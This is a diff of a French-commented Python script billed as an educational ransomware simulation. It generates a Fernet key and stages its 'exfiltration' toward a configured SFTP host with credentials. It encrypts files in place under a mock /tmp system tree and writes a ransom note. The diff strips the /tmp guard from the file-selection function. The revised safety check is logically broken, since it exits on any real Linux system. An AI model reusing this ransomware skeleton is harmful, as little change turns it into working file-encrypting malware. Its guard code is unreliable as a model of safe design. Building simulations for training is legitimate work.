@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# ransomware_total.py - Simulation pédagogique de ransomware Linux
+# ransomware_total_system.py - Simulation pédagogique avancée de ransomware Linux
 
 import os
 import sys
@@ -10,14 +10,14 @@ import socket
 import subprocess
 from datetime import datetime
 
-# Configuration - MODIFIÉ pour environnement de test
-LOG_FILE = "/tmp/ransomware_sim.log"  # Changé vers /tmp pour éviter /var/log
+# Configuration
+LOG_FILE = "/tmp/ransomware_system_sim.log"
 SFTP_SERVER = "192.168.239.130"  # LAISSER VIDE pour la simulation
 SFTP_USER = "test"
 SFTP_PASS = "test"
 SFTP_PORT = 22
-SFTP_REMOTE_PATH = "/tmp/exfil_keys"  # Chemin temporaire
-RANSOM_NOTE = "/tmp/README_SIMULATION.txt"  # Changé vers /tmp
+SFTP_REMOTE_PATH = "/tmp/exfil_keys"
+RANSOM_NOTE = "/tmp/README_SYSTEM_SIMULATION.txt"
 
 # Setup logging
 logging.basicConfig(
@@ -26,26 +26,56 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
+# Liste des répertoires système à cibler (en simulation)
+SYSTEM_DIRS = [
+    "/tmp/system_sim/bin",
+    "/tmp/system_sim/etc",
+    "/tmp/system_sim/lib",
+    "/tmp/system_sim/usr",
+    "/tmp/system_sim/var"
+]
+
+
+def setup_simulation_environment():
+    """Crée une arborescence système simulée pour les tests"""
+    try:
+        # Crée une structure de répertoires simulée
+        for dir_path in SYSTEM_DIRS:
+            os.makedirs(dir_path, exist_ok=True)
+
+            # Crée des fichiers tests dans chaque répertoire
+            for i in range(3):
+                with open(f"{dir_path}/system_file_{i}.dat", 'wb') as f:
+                    f.write(os.urandom(1024))  # Fichiers de 1KB avec données aléatoires
+
+        logging.info("Environnement de test système créé avec succès")
+    except Exception as e:
+        logging.error(f"Erreur création environnement test: {str(e)}")
+        sys.exit(1)
+
 
 def safety_checks():
-    """Nouvelles vérifications de sécurité"""
+    """Vérifications de sécurité renforcées"""
     # Empêche l'exécution sur de vrais systèmes
-    forbidden_paths = ['/home', '/etc', '/bin', '/usr']
-    for path in forbidden_paths:
-        if os.path.exists(path):
-            logging.critical(f"Tentative d'exécution sur un vrai système! Chemin interdit détecté: {path}")
+    real_system_paths = ['/home', '/etc', '/bin', '/usr', '/var', '/lib']
+    for path in real_system_paths:
+        if os.path.exists(path) and not path.startswith('/tmp/'):
+            logging.critical(f"Tentative d'exécution sur un vrai système! Chemin détecté: {path}")
             sys.exit(1)
 
-    # Demande de confirmation
+    # Demande de confirmation explicite
     print("""
-    ⚠️ ATTENTION - SIMULATION UNIQUEMENT ⚠️
-    Ce script est une simulation pédagogique de ransomware.
-    Il NE DOIT PAS être exécuté sur un système réel.
+    ⚠️ ATTENTION - SIMULATION SYSTÈME UNIQUEMENT ⚠️
+
+    Ce script est une simulation pédagogique avancée de ransomware système.
+    Il NE DOIT PAS être exécuté sur un système réel et ne fonctionne que dans /tmp.
+
+    Tous les fichiers manipulés sont des copies simulées dans /tmp.
 
     Appuyez sur Ctrl+C pour annuler maintenant.
     """)
-    confirmation = input("Pour continuer la simulation, tapez 'SIMULATION': ")
-    if confirmation != "SIMULATION":
+    confirmation = input("Pour continuer la simulation système, tapez 'SYSTEM-SIMULATION': ")
+    if confirmation != "SYSTEM-SIMULATION":
         sys.exit(0)
 
 
@@ -68,33 +98,33 @@ def generate_key():
 
 
 def exfiltrate_key(key):
-    """Simule l'exfiltration de clé (ne fait rien réellement)"""
+    """Simule l'exfiltration de clé"""
     try:
-        # Simulation seulement - pas de vraie connexion
         hostname = socket.gethostname()
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        remote_filename = f"{hostname}_{timestamp}.key"
+        remote_filename = f"{hostname}_system_{timestamp}.key"
 
-        # Écrit localement pour simulation
+        # Simulation d'exfiltration
         os.makedirs("/tmp/simulated_exfil", exist_ok=True)
         with open(f"/tmp/simulated_exfil/{remote_filename}", 'wb') as f:
             f.write(key)
 
-        logging.info(f"SIMULATION: Clé aurait été exfiltrée vers {SFTP_SERVER}/{remote_filename}")
+        logging.info(f"SIMULATION: Clé système aurait été exfiltrée vers {SFTP_SERVER}/{remote_filename}")
     except Exception as e:
         logging.error(f"Erreur simulation exfiltration: {str(e)}")
 
 
 def encrypt_file(filepath, fernet):
-    """Chiffre un fichier en place - version sécurisée pour tests"""
+    """Chiffre un fichier en place - version système simulée"""
     try:
-        # Ne traite que les fichiers dans /tmp
+        # Vérification supplémentaire pour ne toucher que /tmp
         if not filepath.startswith('/tmp/'):
             logging.warning(f"Tentative de chiffrement hors zone test: {filepath}")
             return
 
-        if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB max pour les tests
-            logging.warning(f"Fichier trop volumineux pour test, ignoré: {filepath}")
+        # Taille max pour la simulation
+        if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB
+            logging.warning(f"Fichier système simulé trop volumineux, ignoré: {filepath}")
             return
 
         with open(filepath, 'rb') as f:
@@ -105,17 +135,14 @@ def encrypt_file(filepath, fernet):
         with open(filepath, 'wb') as f:
             f.write(encrypted_data)
 
-        logging.info(f"Fichier chiffré (test): {filepath}")
+        logging.info(f"Fichier système simulé chiffré: {filepath}")
     except Exception as e:
         logging.warning(f"Échec chiffrement test {filepath}: {str(e)}")
 
 
 def should_encrypt(path):
-    """Détermine si un fichier doit être chiffré - version sécurisée"""
-    # Exclusion de tous les chemins sauf /tmp
-    if not str(path).startswith('/tmp/'):
-        return False
-
+    """Détermine si un fichier doit être chiffré - version système"""
+    # Exclusion des fichiers de log et du script lui-même
     exclusions = [
         LOG_FILE, RANSOM_NOTE, __file__
     ]
@@ -125,64 +152,68 @@ def should_encrypt(path):
 
 
 def encrypt_system(fernet):
-    """Parcourt et chiffre le système de fichiers - version test"""
-    logging.info("Début simulation chiffrement...")
+    """Parcourt et chiffre le système de fichiers simulé"""
+    logging.info("Début simulation chiffrement système...")
 
-    # Crée un répertoire de test si inexistant
-    test_dir = "/tmp/ransomware_test_files"
-    os.makedirs(test_dir, exist_ok=True)
-
-    # Crée quelques fichiers tests
-    for i in range(3):
-        with open(f"{test_dir}/test_file_{i}.txt", 'w') as f:
-            f.write(f"Fichier de test {i}\n" * 100)
-
-    # Chiffre seulement les fichiers de test
-    for root, dirs, files in os.walk(test_dir):
-        for file in files:
-            filepath = os.path.join(root, file)
-            if should_encrypt(filepath):
-                try:
-                    encrypt_file(filepath, fernet)
-                except Exception as e:
-                    logging.warning(f"Erreur traitement test {filepath}: {str(e)}")
+    # Parcourt tous les répertoires système simulés
+    for system_dir in SYSTEM_DIRS:
+        for root, dirs, files in os.walk(system_dir):
+            for file in files:
+                filepath = os.path.join(root, file)
+                if should_encrypt(filepath):
+                    try:
+                        encrypt_file(filepath, fernet)
+                    except Exception as e:
+                        logging.warning(f"Erreur traitement fichier système {filepath}: {str(e)}")
 
 
 def create_ransom_note(key):
-    """Crée une note de simulation"""
+    """Crée une note de simulation système"""
     note = f"""
-    ⚠️ SIMULATION PÉDAGOGIQUE - PAS DE RANÇON RÉELLE ⚠️
+    ⚠️ SIMULATION SYSTÈME PÉDAGOGIQUE - PAS DE RANÇON RÉELLE ⚠️
 
-    Ceci est une simulation de ransomware pour formation.
-    Aucun fichier réel n'a été chiffré.
+    Ceci est une simulation avancée de ransomware système pour formation.
+    Une arborescence système simulée dans /tmp a été chiffrée.
 
-    Clé de simulation: {key[:8]}...
+    Clé de simulation système: {key[:8]}...
+
+    Fichiers affectés:
+    - /tmp/system_sim/bin/*
+    - /tmp/system_sim/etc/*
+    - /tmp/system_sim/lib/*
+    - /tmp/system_sim/usr/*
+    - /tmp/system_sim/var/*
     """
 
     try:
         with open(RANSOM_NOTE, 'w') as f:
             f.write(note)
-        logging.info("Note de simulation créée")
+        logging.info("Note de simulation système créée")
     except Exception as e:
-        logging.error(f"Erreur création note: {str(e)}")
+        logging.error(f"Erreur création note système: {str(e)}")
 
 
 def simulate_recovery_disable():
-    """Simule la désactivation des mécanismes de récupération"""
-    logging.info("SIMULATION: Désactivation mécanismes de récupération")
+    """Simule la désactivation des mécanismes de récupération système"""
+    logging.info("SIMULATION: Désactivation mécanismes de récupération système")
     # Ne fait rien de réel
 
 
 def simulate_reboot():
-    """Simule un redémarrage"""
-    logging.info("SIMULATION: Redémarrage simulé")
+    """Simule un redémarrage système"""
+    logging.info("SIMULATION: Redémarrage système simulé")
     # Ne fait rien de réel
 
 
 def main():
-    safety_checks()  # Nouvelle vérification de sécurité
+    # Vérifications de sécurité
+    safety_checks()
     check_root()
-    logging.info("=== DÉBUT SIMULATION RANSOMWARE ===")
+
+    # Configuration environnement de test
+    setup_simulation_environment()
+
+    logging.info("=== DÉBUT SIMULATION RANSOMWARE SYSTÈME ===")
 
     # Étape 1: Génération clé
     key = generate_key()
@@ -191,20 +222,20 @@ def main():
     # Étape 2: Simulation exfiltration
     exfiltrate_key(key)
 
-    # Étape 3: Chiffrement test
+    # Étape 3: Chiffrement système simulé
     encrypt_system(fernet)
 
     # Étape 4: Simulation désactivation récupération
     simulate_recovery_disable()
 
-    # Étape 5: Note de simulation
+    # Étape 5: Note de simulation système
     create_ransom_note(key.decode())
 
     # Étape 6: Simulation redémarrage
     simulate_reboot()
 
-    logging.info("=== FIN SIMULATION ===")
-    print("Simulation terminée. Aucun fichier réel n'a été modifié.")
+    logging.info("=== FIN SIMULATION SYSTÈME ===")
+    print("Simulation système terminée. Aucun fichier réel n'a été modifié.")
     print(f"Logs disponibles dans {LOG_FILE}")
 
 
